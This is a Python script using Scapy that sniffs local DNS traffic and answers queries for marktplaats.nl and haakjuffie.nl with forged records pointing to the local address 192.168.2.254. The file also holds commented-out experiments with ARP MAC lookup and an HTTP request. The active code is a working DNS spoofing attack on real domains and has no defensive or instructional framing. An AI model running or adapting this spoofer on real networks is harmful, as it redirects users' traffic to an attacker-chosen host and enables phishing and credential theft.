from itertools import count
from scapy.all import *
load_layer("http")

iface="Ethernet"

ipa="224.0.0.252"

def filter_http_request(pkg):
    return pkg.haslayer(HTTPRequest)
def filter_dns_request(pkg):
    return pkg.haslayer(DNS)

while True:
    # pkt = sniff(count=1, iface=iface, filter="dns")[0] #lfilter=filter_http_request
    pkt = sniff(count=1, iface=iface, lfilter=filter_dns_request)[0] #lfilter=filter_http_request
    print(pkt.summary())
    if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and pkt.haslayer("DNS Question Record"):
        if "marktplaats.nl" in str(pkt["DNS Question Record"].qname) or "haakjuffie.nl" in str(pkt["DNS Question Record"].qname):
            print("[+] DNS Spoofing: {}".format(pkt["DNS Question Record"].qname))
            pkt.show()
            spf_resp =  IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt["DNS Question Record"].qname,rdata="192.168.2.254")/DNSRR(rrname=pkt["DNS Question Record"].qname,rdata="192.168.2.254"))
            sendp(spf_resp)

# def get_mac(ip):
#     arp_request_broadcast = Ether(src="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip) # Broadcast MAC address: ff:ff:ff:ff:ff:ff
#     # Get list with answered hosts
#     answered_list = srp(arp_request_broadcast, timeout=1, verbose=False, iface=iface)[0]
#     return answered_list[0][1].hwsrc if len(answered_list) > 0 else 0

# print(get_mac(ipa))
# test = http_request("www.google.nl", "/", display=True)
# print(test)


# req = HTTP()/HTTPRequest(
#     Accept_Encoding=b'gzip, deflate',
#     Cache_Control=b'no-cache',
#     Connection=b'keep-alive',
#     Host=b'www.google.com',
#     Pragma=b'no-cache'
# )
# a = TCP_client.tcplink(HTTP, "www.google.com", 80)
# answer = a.sr1(req)
# a.close()
# with open("test.html", "wb"
# ) as file:
    # file.write(answer.load)